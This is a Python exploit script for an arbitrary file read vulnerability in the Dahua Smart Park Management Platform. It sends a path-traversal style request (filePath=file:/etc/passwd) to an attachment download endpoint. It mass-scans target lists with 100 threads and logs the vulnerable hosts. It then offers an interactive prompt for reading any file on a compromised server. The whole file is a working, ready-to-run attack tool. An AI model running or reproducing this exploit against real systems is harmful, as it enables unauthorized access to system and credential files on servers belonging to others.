import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:大华智慧园区管理平台任意密码读取
                      date:2024-09-3
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd"
    headers = {
        "User-Agent":"Mozilla/5.0(X11;Linuxx86_64;rv: 102.0)Gecko/20100101Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Length": "2",
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,headers=headers,timeout=5)
            # print(res2.text)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该{target}存在任意文件读取漏洞\n")
                    return True
                # print(res2.text)
            else:
                print(f"该{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(e)
def exp(target):
    print(f"该{target}存在任意文件读取漏洞")
    while True:
        payload = "/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:"
        headers = {
            "User-Agent": "Mozilla/5.0(X11;Linuxx86_64;rv: 102.0)Gecko/20100101Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip,deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Length": "2",
        }
        content = input("请输入要查看的文件，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>>>>")
        if content == "q":
            exit()
        res1 = requests.get(url=target, verify=False, timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload + content, verify=False, headers=headers, timeout=5)
            print(res2.text)
        else:
            print(f"该{content}文件不存在")
if __name__ == '__main__':
    main()